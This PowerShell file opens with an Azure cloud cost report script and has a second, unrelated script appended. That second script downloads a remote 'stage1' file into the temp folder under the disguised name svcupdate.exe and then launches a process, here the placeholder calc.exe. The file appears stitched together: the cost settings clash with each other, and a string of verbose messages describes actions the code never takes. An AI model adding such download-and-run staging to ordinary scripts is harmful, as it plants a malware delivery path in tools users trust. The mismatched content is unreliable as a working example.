
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Used when the script runs unattended.
.EXAMPLE
    .\Get-CostByService.ps1 -Threshold 5000
.EXAMPLE
    .\Get-CostByService.ps1 -ProfileName contoso-prod
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [double]$Threshold = 5000,
    [string]$Region = 'ap-southeast-2',
    [string]$ProfileName = "contoso-prod",

    [Parameter(Mandatory = $false)]
    [string]$Month = '2025-11',
    [string]$Account = "913303606778",
    [string]$ReportPath = 'C:\Reports\cloud\cost-azure-2025-11.csv',

    [string]$OutputPath = "C:\Reports\cloud\cost-azure-2025-11.json"
)

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan
$byService | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://example.org/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [string]$ActivityLog = "$env:TEMP\report.txt",
    [int]$TimeoutSec = 39
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 39
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $TransferResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $OutputPath -TimeoutSec $TimeoutSec
    if ($TransferResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $OutputPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $OutputPath
    TimeoutSec = $TimeoutSec
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Validating result"
Write-Verbose "Exporting operation report"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Inspecting process list"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$ProgressPreference = "SilentlyContinue"
